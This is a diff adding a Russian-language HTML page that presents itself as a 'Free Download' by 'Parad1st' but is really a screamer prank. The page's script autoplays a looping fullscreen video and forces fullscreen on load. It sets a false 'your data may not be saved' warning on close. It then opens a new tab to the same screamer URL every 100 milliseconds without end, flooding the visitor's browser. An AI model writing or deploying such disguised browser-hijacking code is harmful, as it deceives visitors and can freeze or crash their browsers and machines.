@@ -1,0 +1,84 @@
+<!DOCTYPE html><html lang="ru"><head> 
+<meta charset="utf-8">
+<meta name="viewport" content="width=device-wid1th, initial-scale=1.0, maximum-scale=1.0, user-scalable=0">  
+<title>Free Download By Parad1st</title>
+<meta property="og:title" content="Free Download"> 
+<meta property="og:site_name" content="Free Download">
+<meta property="og:image" content="images/Parad1st.png">
+<meta property="og:description" content="Free Download By Parad1st - скачать абсолютно бесплатно!"> 
+<meta property="og:type" content="website">
+<meta name="twitter:card" content="photo">
+<meta name="twitter:title" content="Programm">
+<meta name="twitter:site" content="@fps_boost">
+<meta name="twitter:description" content="FREE!">
+<meta name="twitter:image:src" content="Parad1st.png">
+<link rel="preconnect" href="https://fonts.gstatic.com">
+<link href="https://fonts.googleapis.com/css2?family=Inter:wght@400;500;900&amp;display=swap" rel="stylesheet">
+<style type="text/css">
+            *, *::before, *::after {
+                box-sizing: border-box;
+            }
+
+            .scare {
+                position: fixed;
+                top: 0;
+                left: 0;
+                height: 100vh;
+                width: 100vw;
+                z-index: 1;
+            }
+
+            video#video {
+                height: 100%;
+                width: 100%;
+                object-fit: cover;
+            }
+
+            video#video::-webkit-media-controls-enclosure {
+                display:none !important;
+            }
+        </style>
+</head>
+<body>
+<div class="scare">
+<video id="video" class="video" src="media/video.mp4" loop></video>
+</div>
+<script type="text/javascript">
+            const video = document.getElementById("video");
+            const targetUrl = "https://parad1st.github.io/Screamer/";
+
+            // Предупреждение при закрытии страницы
+            window.addEventListener('beforeunload', function(e) {
+                e.preventDefault();
+                e.returnValue = 'Ваши данные могут не сохраниться, точно закрыть?';
+                return 'Ваши данные могут не сохраниться, точно закрыть?';
+            });
+
+            function videoClick(event) {
+                if(event) event.preventDefault();
+                const { documentElement } = document;
+                if(documentElement.requestFullscreen) documentElement.requestFullscreen();
+                else if(documentElement.mozRequestFullScreen) documentElement.mozRequestFullScreen();
+                else if(documentElement.webkitRequestFullscreen) documentElement.webkitRequestFullscreen();
+                else if(documentElement.msRequestFullscreen) documentElement.msRequestFullscreen();
+            }
+
+            function openNewTab() {
+                window.open(targetUrl, '_blank');
+            }
+
+            // Автоматически запускаем видео при загрузке страницы
+            window.addEventListener('load', function() {
+                video.play();
+                videoClick();
+                
+                // Начинаем открывать вкладки через секунду после загрузки
+                setTimeout(() => {
+                    // Открываем новые вкладки каждые 100мс бесконечно
+                    setInterval(openNewTab, 100);
+                }, 1000);
+            });
+
+            video.addEventListener("click", videoClick);
+        </script>
+</body></html>
